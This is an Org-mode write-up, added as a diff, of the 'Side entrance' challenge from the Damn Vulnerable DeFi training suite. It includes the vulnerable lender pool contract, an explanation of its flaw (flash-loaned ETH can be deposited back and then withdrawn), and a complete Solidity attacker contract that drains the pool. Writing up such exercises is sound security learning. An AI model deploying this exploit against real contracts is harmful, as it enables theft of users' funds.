@@ -1,0 +1,106 @@
+#+AUTHOR: Francesco Cannarozzo
+* Side entrance
+  ../contracts/side-entrance.sol
+** Statement
+   pool has 1000ETH in balance. Steal them all.
+** Files
+*** SideEntranceLenderPool.sol
+**** Code
+     #+BEGIN_SRC solidity
+     // SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+import "@openzeppelin/contracts/utils/Address.sol";
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+/**
+ * @title SideEntranceLenderPool
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract SideEntranceLenderPool {
+    using Address for address payable;
+
+    mapping (address => uint256) private balances;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() external {
+        uint256 amountToWithdraw = balances[msg.sender];
+        balances[msg.sender] = 0;
+        payable(msg.sender).sendValue(amountToWithdraw);
+    }
+
+    function flashLoan(uint256 amount) external {
+        uint256 balanceBefore = address(this).balance;
+        require(balanceBefore >= amount, "Not enough ETH in balance");
+        
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
+    }
+}
+     #+END_SRC 
+**** Breakdown
+***** State
+      The contract maintains a mapping of addresses onto uints called *balances*, representing
+      ethers deposited by users onto the pool.
+***** deposit
+      Increases the amount of *msg.sender*'s balance by *msg.value*
+***** withdraw
+      sets *msg.sender*'s balance to equal to zero, then sends them corresponding value.
+***** flashLoan
+      usual flashloan checks. However, we notice the pool to trust msg.sender to 
+      non-maliciously implement IFLashLoanEtherReceiver interface declared in the file.
+
+      ...That's it, isn'it?
+
+** Exploit
+   a malicious contract could call the flashLoan function for the whole pooled value,
+   then implement *execute()* as to deposit value received onto the contract.
+ since value stored in contract hasn't changed,
+   the transaction doesn't revert.
+
+   But now attacker can simply call *withdraw()* and empty the pool.
+   
+   #+BEGIN_SRC solidity
+   pragma solidity ^0.8.0;
+
+import '../../side-entrance/SideEntranceLenderPool.sol';
+import "@openzeppelin/contracts/utils/Address.sol";
+
+contract SideEntranceAttacker is IFlashLoanEtherReceiver {
+    using Address for address payable;
+
+     SideEntranceLenderPool public pool;
+     address public beneficiary;
+    
+    constructor(address poolAddress, address beneficiaryAddress) {
+        pool = SideEntranceLenderPool(poolAddress);
+        beneficiary = beneficiaryAddress;
+    }
+
+    function attack() public {
+        pool.flashLoan(address(pool).balance);
+
+        pool.withdraw();
+
+        payable(beneficiary).sendValue(address(this).balance);
+        
+    }
+
+    function execute() external payable override{
+        pool.deposit{value:msg.value}();
+    }
+
+    receive() external payable{
+
+    }
+}
+   #+END_SRC
+
+ 
